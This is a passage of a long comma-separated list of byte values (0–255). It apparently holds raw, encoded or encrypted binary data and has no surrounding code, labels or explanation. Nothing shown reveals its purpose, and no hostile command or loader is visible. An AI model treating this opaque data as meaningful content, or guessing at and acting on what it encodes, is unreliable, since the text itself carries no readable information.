,115,109,122,33,240,186,241,231,223,253,219,233,138,11,25,9,29,12,73,177,163,225,28,126,177,230,240,51,74,75,75,190,150,121,15,75,31,65,140,172,68,174,78,186,47,182,250,14,88,35,19,53,17,193,6,15,26,91,212,136,152,129,103,115,121,63,103,122,37,112,17,111,40,132,138,130,114,83,139,109,139,213,48,123,38,104,105,160,172,254,53,114,30,197,218,214,11,16,16,193,159,202,169,248,116,126,127,188,251,184,184,235,176,236,196,208,70,109,68,1,19,15,81,164,234,225,126,232,253,188,171,61,8,16,14,190,128,69,66,80,9,94,158,167,10,180,18,79,92,182,225,48,6,72,2,61,90,135,13,94,1,53,222,157,215,239,61,53,45,122,61,111,125,57,81,49,117,154,143,239,97,83,196,51,129,135,45,127,121,149,127,179,236,185,37,48,109,136,175,142,0,12,65,198,159,207,177,230,119,84,38,230,251,239,172,179,255,253,200,195,22,80,89,12,86,81,79,252,175,70,72,248,161,182,239,61,65,76,71,165,81,90,28,24,21,70,141,252,21,66,21,39,57,163,225,110,65,55,2,105,148,192,66,15,1,75,154,157,145,240,120,53,33,48,122,114,53,30,67,112,181,204,143,151,105,73,158,53,217,213,42,109,126,222,115,213,169,183,111,20,153,128,239,214,4,87,74,157,195,209,251,14,33,29,96,166,224,191,234,179,169,253,235,209,84,80,1,93,4,90,81,80,186,75,85,250,228,172,171,46,74,76,55,165,68,28,93,85,7,86,158,188,3,74,79,34,53,226,227,110,69,35,58,49,199,214,80,69,72,90,156,148,218,97,108,96,98,106,63,99,50,97,33,48,243,153,131,156,105,5,211,47,213,21,100,55,125,206,66,235,223,185,53,96,254,221,248,205,31,10,25,210,153,76,202,6,45,29,60,145,198,173,171,166,166,175,235,129,53,15,89,12,81,21,31,74,175,94,28,240,253,186,225,127,71,17,87,175,10,17,7,89,7,92,253,219,30,29,78,46,88,238,163,107,33,38,58,52,192,198,81,15,64,64,156,141,218,34,122,96,59,40,51,97,125,120,127,114,173,155,131,199,116,80,194,150,202,82,123,42,54,163,48,231,166,170,63,100,237,201,164,155,75,91,21,128,223,12,238,27,45,21,60,139,212,180,186,167,176,191,170,144,70,56,85,1,92,28,18,86,173,75,20,188,243,231,123,121,33,13,65,251,41,7,10,27,11,159,220,128,68,55,31,34,49,242,123,102,48,36,50,66,199,192,78,94,91,212,192,196,138,122,103,43,97,40,59,59,124,116,115,60,189,205,131,220,51,218,129,150,140,20,42,33,125,215,101,231,209,170,110,38,247,134,200,208,7,67,102,219,216,72,230,23,107,69,120,252,176,180,202,241,251,239,140,211,88,7,79,0,65,16,93,22,182,77,93,249,240,188,112,53,56,13,102,254,72,31,87,117,31,128,146,153,87,27,34,96,53,236,33,112,45,99,50,101,203,148,0,116,1,220,198,141,141,121,94,34,56,49,160,97,63,58,39,111,168,208,196,230,112,193,198,128,150,11,100,118,60,149,251,241,239,240,37,48,233,175,226,148,1,2,0,163,220,82,169,79,32,19,160,182,176,201,188,160,226,191,248,218,88,2,79,73,31,20,83,22,224,27,28,167,172,161,58,51,56,15,44,255,16,10,70,112,11,135,215,209,5,69,15,63,133,160,99,45,29,101,24,113,198,53,26,110,16,154,198,158,249,33,116,42,209,32,189,97,12,106,122,84,189,155,215,252,40,196,223,154,203,14,104,113,15,180,240,191,174,173,38,106,183,197,248,24,81,76,10,144,222,71,187,23,0,10,250,252,178,217,168,166,230,191,232,71,71,14,4,17,7,67,77,88,182,27,138,251,187,226,50,104,118,16,106,116,91,67,13,44,14,159,136,128,91,65,59,61,245,241,115,42,96,118,50,110,137,119,76,37,28,205,146,196,192,123,219,122,203,62,172,123,123,58,98,60,177,241,144,178,46,220,145,206,139,83,9,113,92,197,204,186,236,224,111,98,166,232,239,71,3,20,25,211,178,33,230,85,1,17,253,231,227,228,234,224,227,248,180,90,70,2,5,0,92,6,79,86,91,79,142,228,187,188,58,116,56,122,113,101,65,33,6,67,7,155,141,149,19,16,50,60,155,238,33,38,60,63,106,241,219,37,86,45,91,218,208,132,8,43,195,51,138,123,167,96,18,110,101,162,177,177,147,223,117,200,146,206,215,69,80,73,12,222,176,189,167,171,46,231,236,249,167,77,113,6,10,202,222,77,80,85,4,83,252,231,162,173,225,53,187,254,177,73,22,18,13,16,57,64,93,74,27,86,206,253,250,171,101,51,43,113,39,105,90,17,71,42,7,133,220,214,5,75,101,118,142,173,54,49,45,41,62,252,157,101,66,37,65,151,139,131,76,105,147,52,141,38,251,123,120,42,122,253,165,160,155,252,57,134,139,212,28,95,80,44,30,182,238,164,174,12,118,171,172,187,185,71,4,64,86,202,64,74,38,23,5,15,233,187,180,249,233,44,180,164,240,73,84,22,68,1,134,27,80,80,83,18,197,170,187,172,125,62,33,124,62,125,10,67,78,115,145,133,130,219,31,19,47,54,134,167,58,102,48,54,106,176,155,37,7,56,28,197,144,158,22,97,128,51,212,50,230,45,127,127,123,178,175,246,145,190,36,196,165,214,7,82,81,119,12,150,253,176,250,94,113,150,246,249,255,6,19,65,239,212,93,12,22,88,1,29,233,230,241,9,187,119,252,182,248,73,88,2,114,4,156,16,94,12,93,86,255,230,187,94,125,101,47,122,62,28,72,37,66,104,219,240,135,139,56,82,98,39,159,58,122,58,33,62,64,176,144,101,84,115,216,216,140,141,10,126,210,86,214,230,180,122,122,33,115,167,243,176,205,183,165,193,203,220,70,91,90,113,30,219,191,175,252,94,63,182,232,239,157,90,13,36,251,154,7,23,16,79,86,15,240,5,237,68,166,48,225,228,186,73,32,14,105,28,241,10,77,77,7,11,147,148,240,32,112,35,54,113,44,125,1,77,114,126,218,137,201,255,71,65,119,215,129,47,96,44,117,52,106,252,221,101,62,115,201,196,139,194,11,48,151,50,154,169,180,119,36,43,125,252,172,171,241,167,253,218,132,220,70,17,81,111,74,15,191,247,185,82,37,243,138,173,51,8,76,30,165,146,28,72,1,23,11,140,255,15,171,81,237,42,190,237,237,27,46,64,127,6,208,0,2,17,11,198,201,142,241,116,59,127,43,51,119,53,118,77,118,104,132,241,142,220,90,129,55,208,217,59,97,96,113,43,50,234,173,37,126,110,157,254,146,202,127,96,134,218,207,235,230,63,12,104,60,163,249,247,187,183,239,208,129,220,92,17,81,19,74,85,228,163,204,84,41,255,232,234,49,28,17,7,191,141,83,72,72,20,90,248,160,18,240,81,231,48,231,225,38,89,59,31,61,0,134,26,65,28,66,156,142,192,227,122,50,63,89,42,123,108,106,91,110,48,193,147,196,142,5,156,48,205,195,43,49,96,105,53,191,171,246,123,17,105,145,254,205,132,7,9,134,159,212,189,166,98,109,104,182,160,189,174,189,247,253,144,219,128,27,66,90,1,92,81,186,175,166,125,118,255,247,245,46,80,76,93,187,194,31,66,87,72,74,146,254,78,171,93,177,48,174,225,126,65,82,85,53,8,156,90,15,6,11,192,143,205,240,59,96,37,106,43,114,116,106,77,107,60,155,220,152,110,19,203,119,208,151,125,98,127,219,39,231,182,237,57,88,28,128,212,208,80,76,80,150,220,208,160,160,108,101,123,250,240,250,180,164,190,169,200,138,65,4,3,76,19,76,79,176,197,185,20,186,255,172,224,114,26,3,66,191,91,91,49,89,83,27,158,251,87,198,79,32,42,241,252,110,29,36,90,105,31,135,74,89,10,65,130,213,152,227,116,55,55,38,116,103,117,105,34,126,42,158,138,151,111,109,192,119,204,217,42,43,122,215,115,241,178,185,119,114,63,145,175,138,71,6,91,210,221,216,176,186,98,55,42,181,190,173,244,225,182,234,237,195,88,74,30,24,19,104,84,235,225,56,94,225,167,188,187,37,81,21,86,251,28,75,78,72,85,112,146,172,94,74,78,122,109,166,237,55,29,39,22,101,135,133,81,90,70,11,243,212,152,43,44,99,45,36,32,114,52,57,16,109,189,202,139,130,100,5,211,49,217,197,126,59,126,195,110,179,170,168,50,114,231,154,227,208,92,70,11,156,171,208,225,6,119,83,104,160,190,184,184,179,172,241,248,205,71,4,29,15,86,13,79,84,251,27,14,251,230,188,183,111,8,124,123,228,64,68,84,16,73,74,219,141,87,74,79,34,109,235,227,109,80,36,62,61,158,152,0,77,88,29,221,157,136,101,21,49,53,106,51,101,109,96,123,59,180,254,138,153,117,8,211,113,203,15,127,33,110,131,39,215,236,177,112,96,157,227,174,150,3,23,1,210,159,75,160,79,123,21,123,183,251,210,250,187,189,169,244,202,92,26,13,24,81,90,83,81,251,80,14,186,231,238,161,42,123,11,109,147,41,65,70,23,7,91,140,204,66,16,18,99,43,226,175,55,96,37,103,111,133,198,0,69,10,26,221,213,218,122,99,118,36,40,33,59,101,120,97,55,164,136,243,199,110,21,145,143,204,10,112,112,15,133,117,189,167,161,115,49,233,193,164,145,3,74,10,154,152,25,223,23,54,15,102,184,240,228,250,187,224,237,241,161,43,74,13,4,90,28,60,78,241,94,16,172,225,188,96,41,42,76,62,181,72,90,78,74,95,128,220,140,70,82,5,81,90,226,43,42,62,37,102,116,203,216,66,95,64,178,202,196,221,40,109,122,97,124,58,61,109,55,98,112,189,136,215,155,117,137,218,206,155,9,104,112,110,196,46,179,132,169,118,122,254,216,183,203,92,86,68,141,196,17,214,88,107,79,42,236,182,228,250,164,176,190,186,129,0,92,5,31,5,6,5,26,175,86,28,186,241,249,58,61,89,13,38,190,72,64,93,60,95,159,219,153,25,23,79,46,133,235,33,59,113,117,123,47,199,148,26,60,88,157,156,148,129,63,99,99,111,58,180,97,34,116,105,108,189,136,131,172,112,192,154,194,208,14,121,99,39,143,235,161,167,183,103,122,236,145,183,148,29,124,23,206,153,94,177,23,110,95,240,227,162,190,231,208,176,235,186,207,0,2,1,0,81,74,73,88,170,80,143,164,130,250,60,121,56,15,124,228,68,60,71,126,15,128,150,153,68,94,81,118,159,176,49,108,105,32,106,61,203,62,10,37,95,128,135,223,145,58,125,46,204,123,160,122,112,118,33,55,203,247,155,252,62,144,192,129,150,79,104,113,18,133,161,231,239,181,77,101,236,223,254,26,81,0,81,209,132,31,165,23,91,13,177,253,177,187,161,246,179,244,246,71,22,19,30,110,75,27,24,88,163,10,140,188,201,226,50,111,95,27,44,37,64,12,12,50,100,135,158,137,95,29,42,58,207,241,61,44,106,32,102,247,154,17,66,52,72,145,146,158,218,112,207,55,203,40,184,96,109,58,99,84,175,224,193,173,53,196,202,220,184,14,17,59,12,155,176,252,236,181,103,97,237,224,185,71,2,14,25,194,193,94,87,3,1,9,251,182,172,239,234,179,187,244,186,88,88,70,24,73,65,90,81,81,74,71,183,224,183,231,32,53,56,58,42,110,91,83,88,60,78,242,134,205,81,65,51,97,128,240,122,126,6,126,62,241,203,20,90,125,72,254,221,129,74,112,148,53,216,124,184,114,97,107,62,165,242,170,193,237,62,200,202,194,27,80,5,121,23,130,168,189,236,173,40,225,231,187,183,28,90,29,16,208,205,23,75,4,80,20,250,252,235,173,234,46,181,237,240,40,90,70,13,8,78,29,10,12,93,23,137,249,227,246,50,121,106,113,50,52,95,23,93,47,9,154,193,138,80,75,119,97,151,226,96,111,104,97,62,190,153,7,86,18,47,154,149,133,92,113,218,112,153,33,186,102,97,36,127,224,179,184,202,169,52,174,156,215,0,13,86,117,15,194,168,189,191,16,119,145,239,249,183,31,14,25,65,232,68,80,16,15,18,14,233,166,177,76,240,109,242,254,248,29,53,18,1,6,192,0,92,69,28,87,248,250,235,188,59,100,122,38,42,50,16,74,10,41,132,214,157,141,71,6,35,32,151,132,125,102,117,115,125,250,192,8,84,107,197,150,155,154,23,101,222,96,154,97,172,108,47,58,103,190,179,239,205,252,36,223,145,219,118,10,24,122,86,253,236,186,246,5,53,171,187,155,162,76,65,28,230,212,17,10,89,30,3,29,240,250,178,93,164,42,250,137,232,44,0,77,44,0,216,66,31,75,28,10,207,251,175,49,102,36,52,63,124,49,10,82,111,114,132,128,153,153,71,1,47,56,151,104,49,41,121,41,33,193,155,47,26,108,192,197,142,144,90,123,196,34,212,190,247,58,120,112,127,178,252,184,131,234,165,220,207,192,70,20,80,107,109,79,187,175,225,12,114,224,236,237,163,64,87,31,181,144,70,10,89,23,2,15,225,89,237,93,160,57,160,250,248,12,101,16,49,74,134,82,84,64,83,28,132,152,172,103,62,45,42,97,78,125,28,17,49,47,159,245,199,153,31,94,45,205,207,33,33,68,104,53,62,230,137,119,114,113,208,194,195,157,30,122,218,197,167,177,246,48,117,15,59,160,242,171,171,173,191,223,151,222,91,79,10,113,12,79,164,178,174,82,46,231,187,239,111,8,11,6,150,208,44,17,115,2,30,140,248,66,246,81,184,93,170,165,114,64,47,12,116,71,133,94,65,59,74,158,145,139,161,98,62,122,41,34,119,109,49,77,126,100,153,209,134,141,81,145,106,193,132,33,54,1,43,99,102,182,235,121,48,111,219,199,218,235,30,43,144,195,151,169,247,98,125,58,97,230,165,171,224,252,178,216,138,214,0,20,9,11,10,75,231,220,162,13,37,171,182,177,37,24,65,90,155,214,1,80,27,79,80,135,165,91,225,28,234,112,187,191,107,88,120,76,82,1,198,82,2,10,7,213,197,138,251,116,50,45,54,33,59,109,107,79,109,114,149,129,155,111,19,156,119,188,153,96,103,125,41,47,163,172,251,19,122,107,167,164,146,155,91,16,134,217,202,207,167,58,109,32,231,190,226,250,241,190,181,138,195,194,74,104,76,11,11,93,168,177,250,28,118,224,167,247,42,27,17,14,247,206,95,22,27,87,1,142,189,94,183,20,251,41,170,245,44,5,120,20,61,27,134,80,77,64,95,129,147,152,235,54,102,56,53,43,99,52,107,75,60,47,129,154,128,46,31,221,35,145,130,42,100,110,131,66,187,172,185,127,114,106,148,197,146,26,76,17,196,212,150,169,253,106,29,41,250,251,173,236,235,241,178,200,155,76,93,25,90,75,13,93,252,241,190,20,167,255,238,187,61,74,17,75,231,10,75,64,76,19,69,134,250,87,180,79,46,53,238,229,111,71,126,64,61,4,214,75,103,13,1,193,183,217,246,101,48,58,40,113,114,125,110,75,119,50,201,154,134,62,79,221,108,154,155,33,42,121,143,52,241,166,250,47,114,113,197,163,142,10,23,15,192,222,154,189,161,54,95,122,160,252,190,170,160,229,159,244,208,12,91,89,64,64,92,59,240,171,74,94,176,225,230,161,61,1,91,35,251,91,95,45,85,21,28,158,187,69,30,83,34,57,236,229,126,11,117,10,44,129,140,32,92,29,68,219,157,144,127,102,118,33,36,51,122,63,110,81,55,254,145,199,214,124,79,218,48,217,129,127,113,59,207,101,179,242,173,56,102,183,197,248,155,14,70,9,138,217,140,202,31,58,14,41,177,188,201,173,186,251,253,234,140,65,93,20,10,19,6,68,62,178,12,5,224,186,226,224,92,8,15,45,190,65,7,70,11,69,18,202,139,31,64,84,61,43,226,251,126,91,111,34,46,155,156,26,8,94,71,128,151,137,32,97,34,61,97,103,114,125,49,115,42,174,219,215,214,29,84,192,123,157,12,100,99,98,215,43,186,190,225,107,114,242,222,164,198,75,7,102,218,196,58,185,4,112,29,120,227,240,173,247,191,251,237,248,208,16,18,31,22,27,91,68,63,175,80,78,167,225,253,245,111,96,17,50,247,72,7,90,22,16,133,248,219,89,94,83,60,48,161,225,49,54,120,112,47,137,157,84,65,28,26,128,196,145,124,33,122,111,63,32,126,97,97,58,104,252,129,131,214,40,14,193,156,155,84,39,109,15,158,54,250,237,246,110,98,231,223,190,142,0,30,16,202,193,17,254,30,112,124,42,182,160,173,190,165,242,232,187,218,70,113,31,30,1,69,18,23,163,76,16,142,171,253,102,111,56,74,62,238,80,75,78,89,17,147,210,153,21,23,14,79,19,186,16,49,121,35,50,61,135,190,16,88,93,198,219,153,208,103,120,70,35,63,160,38,117,44,100,42,189,156,226,147,114,173,221,221,203,121,112,44,124,219,104,162,167,171,126,114,236,218,187,192,26,22,25,203,221,77,185,23,54,95,97,189,250,189,161,189,166,253,189,145,93,20,3,26,27,19,85,75,182,72,8,253,240,246,60,116,108,74,62,239,89,26,7,52,72,147,150,137,24,66,72,61,216,161,103,112,119,55,123,42,222,134,90,41,10,212,155,223,215,59,120,34,48,103,215,114,15,97,115,112,244,136,145,241,114,135,156,221,215,73,104,33,119,194,225,186,187,247,103,98,182,157,229,90,80,2,21,141,193,78,237,69,54,73,189,160,224,203,237,161,252,178,238,205,67,20,20,90,80,27,31,76,186,75,210,174,250,188,35,110,56,81,45,228,65,81,66,40,83,159,142,219,21,68,113,122,216,186,48,38,96,37,50,61,144,53,3,41,72,212,155,141,148,120,125,103,128,38,213,42,12,118,33,31,255,182,149,182,40,156,157,199,217,15,33,49,18,215,130,170,202,171,37,100,254,201,249,26,85,30,21,175,222,28,160,94,92,29,233,250,196,173,164,162,225,245,170,64,71,10,3,8,1,28,81,26,17,74,133,252,237,250,119,105,107,15,55,125,68,83,9,120,85,199,144,140,3,0,113,124,213,242,122,111,54,59,39,176,137,100,26,125,70,212,146,207,141,125,155,59,157,36,172,49,57,107,103,188,177,169,145,234,110,154,219,206,217,79,1,111,18,168,188,191,186,161,111,96,238,235,227,92,0,7,77,194,142,78,13,31,74,17,229,244,176,186,185,186,189,245,237,44,68,2,13,8,92,19,57,17,31,86,211,252,237,172,33,77,49,97,45,50,28,91,92,42,78,209,198,219,95,71,35,4,135,234,33,107,106,52,96,241,145,35,91,125,68,218,133,207,124,125,195,42,155,106,184,114,101,116,115,190,255,171,194,173,112,198,197,156,70,83,74,113,127,131,168,164,191,235,103,250,177,186,163,28,9,2,91,144,7,71,1,94,18,84,171,172,250,233,234,53,231,253,248,7,68,103,66,80,4,21,4,84,21,87,157,228,243,238,62,33,52,25,46,100,6,86,92,100,18,157,158,208,79,0,92,56,151,236,115,126,54,47,96,219,219,119,90,113,85,204,192,207,91,101,128,99,192,33,165,96,126,126,33,252,241,253,131,252,48,138,129,140,28,21,20,107,95,192,252,167,189,84,114,251,166,239,164,26,19,86,8,132,83,86,27,94,2,15,189,187,224,81,168,119,187,185,244,73,12,14,79,75,128,64,84,72,91,13,139,252,161,120,36,62,49,37,55,110,90,2,29,46,154,220,159,255,71,8,92,32,133,176,58,103,105,65,124,171,153,50,66,107,208,181,144,156,11,97,128,58,216,60,224,106,100,117,49,243,201,199,215,251,124,198,209,206,18,95,11,111,13,215,184,176,190,121,126,176,189,241,183,4,90,71,165,128,83,63,24,114,1,21,252,68,177,9,240,33,170,252,233,69,92,14,43,0,204,64,31,26,71,94,143,248,227,103,32,61,122,97,113,113,70,23,105,60,202,154,142,141,71,82,55,61,129,125,58,102,113,127,60,190,133,100,107,117,197,193,155,155,92,67,210,34,145,230,186,48,57,126,39,251,233,241,193,255,233,218,143,143,17,83,125,73,81,76,230,180,166,20,41,243,166,249,229,4,91,26,163,209,83,10,89,27,18,209,189,78,192,56,187,109,234,162,156,89,59,14,61,16,130,67,21,76,48,87,148,218,235,99,113,79,18,113,62,113,116,1,114,46,128,129,151,141,85,10,54,217,216,122,58,44,97,39,60,247,129,35,48,52,136,204,206,131,14,61,222,218,157,176,224,43,116,104,99,253,255,234,187,183,253,144,209,154,18,8,90,2,70,31,187,235,183,5,2,188,157,240,51,92,65,76,247,206,1,87,80,4,30,137,225,49,230,93,168,57,242,227,118,8,67,80,101,76,148,65,77,26,64,128,133,148,161,16,24,75,46,51,106,113,112,10,42,126,134,220,128,205,19,199,53,188,159,58,33,124,45,104,36,178,170,101,60,117,175,212,145,200,9,8,192,216,145,187,189,106,63,120,49,253,180,182,250,183,238,196,143,206,27,69,93,5,23,72,164,171,174,15,107,229,230,233,49,74,124,6,247,189,93,72,27,95,0,158,168,30,174,60,231,47,176,237,103,27,55,80,45,21,213,53,91,28,95,129,142,249,250,44,32,56,122,33,32,51,25,105,102,125,136,246,218,36,8,155,97,203,195,104,115,122,106,102,250,236,175,103,106,109,133,198,198,64,7,65,154,178,206,252,186,54,46,42,231,253,232,224,241,252,180,138,195,223,6,79,81,19,13,93,215,175,174,6,176,227,188,240,116,92,16,76,255,209,93,42,13,14,118,220,248,69,176,73,186,79,238,249,27,95,55,96,53,24,135,26,5,93,64,211,197,214,162,32,62,62,32,35,97,125,113,83,31,50,132,193,142,107,31,187,97,209,153,12,39,15,222,53,241,252,236,100,96,125,221,199,205,29,76,93,182,205,187,169,164,110,20,11,224,161,161,180,179,173,253,138,207,88,80,29,20,57,93,85,160,224,31,15,171,187,187,240,43,92,15,26,228,64,83,30,75,20,1,151,250,4,170,18,54,48,128,175,59,29,47,100,110,155,156,26,88,65,17,208,142,192,161,32,108,36,58,123,107,50,107,2,126,48,136,148,158,59,8,211,111,129,134,96,113,123,215,101,225,172,247,57,126,111,139,165,208,81,30,14,202,205,140,177,4,4,79,41,227,188,245,241,186,190,186,234,215,66,4,114,64,90,30,15,164,173,10,94,188,191,238,241,66,65,23,36,164,64,7,92,76,78,109,158,249,69,68,78,124,109,186,253,105,17,82,36,120,219,132,7,77,13,95,138,207,218,49,124,8,100,106,113,100,63,14,27,126,177,153,131,155,114,71,156,112,215,84,48,113,126,195,52,171,252,171,102,126,172,139,162,138,31,16,25,210,205,148,249,88,45,21,102,244,192,191,176,235,187,245,233,214,71,91,13,74,6,76,75,17,225,70,20,248,251,186,245,114,122,79,112,185,13,7,92,80,7,18,150,151,95,19,81,125,57,235,237,126,91,99,59,105,133,156,76,95,7,83,132,206,136,49,120,43,62,108,114,114,113,55,106,60,255,201,147,214,106,85,211,141,144,9,96,118,110,215,63,160,252,170,103,97,238,192,167,145,1,11,25,210,174,79,185,91,110,29,104,250,251,249,161,160,187,175,235,129,88,6,68,20,10,82,74,88,178,74,72,232,243,173,240,61,54,13,102,163,13,74,7,1,21,154,198,153,91,70,84,58,123,242,175,114,112,36,62,43,198,204,78,90,70,197,135,207,142,103,120,107,33,40,99,42,46,32,50,109,167,154,148,232,124,8,223,156,213,8,121,115,39,158,39,187,186,248,117,106,254,193,183,199,19,9,23,202,216,77,165,83,108,21,33,244,235,226,190,235,242,253,236,208,92,1,1,31,81,82,68,84,175,12,28,232,161,168,125,111,56,27,123,230,98,17,66,37,69,154,210,203,70,71,81,39,33,243,115,114,45,36,125,49,137,216,83,103,72,128,198,159,148,105,38,43,63,97,162,96,117,105,33,105,151,155,139,157,110,208,145,214,217,29,123,122,30,131,164,246,188,240,34,96,247,193,160,150,1,25,11,206,130,17,169,1,98,14,102,236,224,181,186,165,216,244,185,141,29,80,72,65,0,64,5,57,171,94,83,188,187,226,112,36,34,76,102,254,46,74,64,110,21,147,135,205,95,10,31,63,209,242,32,109,111,46,112,101,194,204,74,115,16,152,221,131,220,105,97,53,206,58,172,123,47,116,60,106,189,199,139,174,101,200,219,206,201,11,44,119,110,156,164,191,231,174,103,124,230,128,190,29,90,66,86,128,217,86,235,79,32,82,170,225,237,173,187,241,227,149,244,93,6,14,4,8,10,94,93,17,170,23,207,161,240,182,115,92,106,97,62,163,90,83,89,52,15,147,138,149,4,29,97,46,158,234,115,108,110,55,50,51,133,101,85,110,7,183,128,159,128,105,199,118,154,97,164,88,109,32,97,105,242,240,143,176,46,135,156,221,149,20,122,4,74,196,206,189,174,185,118,126,237,171,187,17,27,29,8,204,130,94,167,79,70,82,241,172,195,190,202,250,242,137,248,90,77,11,25,119,19,65,84,79,1,87,197,176,240,188,32,36,42,26,48,105,68,77,12,104,19,147,202,128,8,64,55,60,143,234,100,31,43,55,59,252,128,119,80,108,1,150,146,141,148,97,222,42,128,112,252,100,124,120,125,161,174,180,219,190,53,129,177,169,141,5,81,44,18,217,250,241,231,171,122,224,242,234,190,80,27,14,25,139,193,80,76,6,70,95,231,250,224,191,168,250,242,225,186,42,0,71,114,31,1,90,15,73,31,77,223,167,183,224,32,105,42,58,48,48,90,39,70,60,7,147,214,153,3,74,54,38,151,241,33,104,97,101,36,255,155,126,66,52,68,157,158,217,76,120,134,51,216,36,180,54,37,102,106,253,171,184,131,241,97,144,178,220,1,4,16,42,77,143,187,167,224,168,40,235,166,235,165,71,65,65,77,209,17,94,65,5,18,20,224,151,231,161,185,48,252,254,172,91,69,11,95,8,198,65,15,88,83,76,137,249,239,251,102,37,119,63,45,41,28,83,68,115,14,245,154,136,14,94,47,62,218,173,115,125,54,69,112,168,193,123,80,28,68,157,230,217,30,96,173,34,216,32,160,100,11,122,115,163,219,241,205,252,104,154,208,219,66,84,77,123,23,194,161,162,162,94,40,255,254,157,161,8,19,6,163,144,93,12,89,66,28,29,251,244,187,20,176,43,251,165,248,11,26,71,24,6,219,65,4,17,93,28,147,167,161,120,33,98,113,103,40,111,28,67,71,52,152,199,193,149,80,65,55,96,212,42,96,118,106,50,123,235,129,110,66,113,134,150,144,207,18,101,222,34,151,49,231,116,97,41,96,178,189,252,141,190,241,198,166,215,30,15,12,42,11,196,161,187,162,12,103,182,159,233,165,77,27,75,247,194,1,29,89,23,18,79,187,21,240,93,161,57,190,252,183,92,27,22,46,6,134,91,95,23,0,76,138,148,167,32,125,62,56,103,48,52,72,17,119,110,193,139,153,248,85,66,42,38,132,102,49,122,112,115,33,234,204,110,101,56,199,221,149,152,76,101,210,49,128,235,184,112,122,58,33,171,239,184,160,182,236,183,210,199,18,15,9,99,11,83,187,179,183,15,112,235,254,249,164,64,11,23,181,218,78,94,89,67,3,141,189,87,174,78,160,53,251,237,232,90,55,27,61,31,198,82,50,17,37,6,220,152,168,54,42,61,43,46,124,37,96,1,57,42,201,129,159,151,86,92,49,155,195,127,103,38,60,39,24,167,175,119,126,115,157,155,142,217,23,105,144,212,154,160,162,106,27,100,115,178,229,250,231,166,241,216,165,140,30,29,74,1,30,9,186,163,252,127,114,243,232,241,44,17,74,29,181,144,83,31,22,69,74,150,160,24,182,93,225,49,242,249,42,11,63,14,41,31,219,82,12,10,71,202,210,140,128,116,125,45,52,37,106,113,49,84,49,100,156,139,130,145,84,177,49,209,246,104,106,39,56,41,32,178,252,59,97,47,201,183,168,158,12,21,218,205,206,253,246,106,109,58,39,186,164,177,187,182,253,184,188,198,26,20,83,3,12,15,237,187,132,13,103,224,247,234,43,29,91,0,229,194,83,76,64,11,30,209,249,95,187,73,206,47,234,175,114,88,72,64,111,16,148,0,95,88,71,208,149,204,161,116,50,45,61,33,114,110,48,90,111,53,208,220,134,112,85,139,53,209,151,102,58,125,59,47,161,176,181,37,114,110,201,197,241,27,9,21,219,195,202,230,173,98,53,58,149,186,173,241,240,237,175,200,138,135,0,13,13,81,92,9,231,230,236,85,253,225,128,171,46,25,91,28,181,206,11,86,78,95,85,251,233,31,176,5,38,57,245,164,102,63,37,103,36,18,214,14,15,80,53,128,212,202,240,105,123,33,56,42,114,117,107,79,105,60,159,219,142,110,4,211,119,206,151,125,49,39,149,47,164,230,181,35,114,52,143,187,203,117,82,0,128,137,206,169,188,32,9,100,230,253,245,214,231,183,236,219,155,29,70,24,10,11,22,60,168,163,6,11,249,146,186,176,51,8,3,28,247,72,11,22,72,99,85,198,241,94,171,18,46,90,242,227,84,94,98,16,52,198,221,66,15,1,67,128,183,139,244,53,50,108,40,59,114,57,28,10,108,229,198,139,135,116,71,211,76,139,151,126,59,123,133,96,241,183,251,119,38,116,216,160,205,26,70,91,210,197,216,251,5,123,8,61,244,178,186,218,242,173,244,233,155,88,0,25,20,90,95,93,76,170,76,28,224,177,238,224,61,111,16,40,230,1,93,92,24,14,0,158,171,69,91,84,97,44,173,255,31,73,55,32,110,154,192,78,68,91,50,241,212,144,13,102,112,45,76,59,96,87,116,81,112,177,204,143,218,124,31,211,47,206,19,97,44,125,152,55,241,242,251,102,60,254,197,229,218,4,80,4,219,196,76,169,79,112,19,56,189,252,239,171,191,166,241,186,203,64,30,30,24,31,9,5,80,163,78,14,253,235,182,249,127,113,97,54,182,72,28,28,22,45,80,137,137,69,70,84,57,33,243,142,63,54,37,126,23,209,135,26,31,95,83,208,242,215,96,32,107,33,105,43,114,100,49,96,105,179,218,139,199,40,71,154,135,145,21,58,114,125,149,66,246,183,171,103,59,182,133,167,218,90,30,25,196,153,94,253,0,110,15,123,244,163,184,252,171,252,191,246,143,68,116,31,94,81,0,75,0,177,10,78,232,230,184,123,61,42,26,106,247,72,68,93,27,22,154,253,138,15,94,5,108,123,241,237,108,33,63,77,116,133,154,80,89,91,221,146,141,152,105,22,96,95,40,34,103,47,49,60,126,181,145,155,220,50,198,199,215,200,15,42,36,44,132,39,163,174,251,117,126,247,219,251,208,2,18,16,141,140,10,235,23,107,29,127,248,171,181,168,170,234,237,239,195,84,10,68,16,26,28,93,11,177,87,89,232,161,226,101,49,119,20,123,221,24,28,28,53,17,147,138,205,71,94,93,34,107,174,107,49,107,126,125,127,137,128,74,116,13,212,192,129,152,32,38,96,60,103,162,60,47,106,107,44,170,154,155,232,53,218,192,139,208,10,121,42,32,149,176,204,231,252,103,37,237,208,183,142,65,27,16,204,219,94,218,118,112,29,189,166,224,226,225,166,190,169,177,160,6,81,30,24,3,30,18,39,225,59,15,250,251,226,62,46,89,21,42,221,72,86,70,117,30,155,204,149,15,82,68,39,216,240,33,59,83,126,43,115,221,214,82,49,89,218,129,141,143,105,122,107,187,112,241,126,97,26,100,31,165,134,207,190,114,129,199,136,202,29,58,113,9,253,190,241,189,236,50,124,239,197,185,92,65,30,80,141,159,82,165,31,43,20,160,182,227,186,231,235,251,253,234,88,21,11,85,25,71,16,15,88,181,80,226,252,183,230,38,100,122,26,65,113,10,80,7,53,11,155,146,219,87,69,45,108,197,246,115,112,41,36,42,114,153,47,84,101,82,181,128,232,152,67,199,122,209,122,236,48,126,54,35,44,175,184,147,252,40,129,218,223,205,29,104,112,12,194,130,187,174,247,103,38,177,171,229,34,6,30,92,141,231,17,224,64,5,73,224,248,182,239,166,241,234,250,183,17,17,19,13,8,19,94,76,12,48,28,145,225,237,173,50,40,96,87,39,116,95,79,95,50,21,129,198,149,21,82,55,103,151,238,99,112,105,126,102,190,193,123,82,28,90,199,192,141,11,122,222,109,193,59,161,106,123,120,96,230,165,250,139,216,40,200,145,135,215,79,11,44,8,133,204,225,182,240,103,161,236,245,245,26,0,14,87,163,143,72,1,88,1,17,251,237,240,164,168,253,250,237,240,73,12,2,29,90,31,92,10,0,0,17,133,186,237,238,60,52,116,112,50,110,94,6,86,60,20,155,220,129,79,48,113,46,151,243,102,49,117,101,33,175,137,35,91,5